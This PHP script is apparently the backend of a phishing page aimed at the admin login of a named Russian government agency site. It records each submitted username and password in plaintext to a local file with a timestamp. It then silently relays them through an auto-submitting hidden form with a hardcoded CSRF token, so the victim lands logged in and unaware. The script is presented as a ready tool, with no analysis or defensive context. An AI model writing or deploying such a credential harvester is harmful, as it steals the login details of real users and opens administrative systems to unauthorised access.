<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["username"]) && isset($_POST["password"])) {
    $name = $_POST["username"];
    $password = $_POST["password"];
    $target_url = "https://rosgranstroy.ru/admin/auth/login";

    // Запись в файл
    file_put_contents("data.txt", "Username: " . $name . " Password: " . $password . " Time: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);

    // Автоматическая отправка данных на целевой сайт
    echo '
    <!DOCTYPE html>
    <html>
    <head>
        <title>Перенаправление...</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    </head>
    <body>
        <form id="autoSubmitForm" action="' . $target_url . '" method="post">
            <input type="hidden" name="username" value="' . htmlspecialchars($name) . '">
            <input type="hidden" name="password" value="' . htmlspecialchars($password) . '">
            <input type="hidden" name="remember" value="1">
            <input type="hidden" name="_token" value="Mobv85pKyA5qhG6iYqMCp2lTnq4xGz5ng0xcjDsv">
        </form>
        <script>
            document.getElementById("autoSubmitForm").submit();
        </script>
        <noscript>
            <p>Если перенаправление не произошло, <button type="submit" form="autoSubmitForm">нажмите здесь</button></p>
        </noscript>
    </body>
    </html>';
    exit();
} else {
    // Если кто-то попал сюда напрямую - вернуть на главную
    header('Location: index.html');
    exit();
}
?>
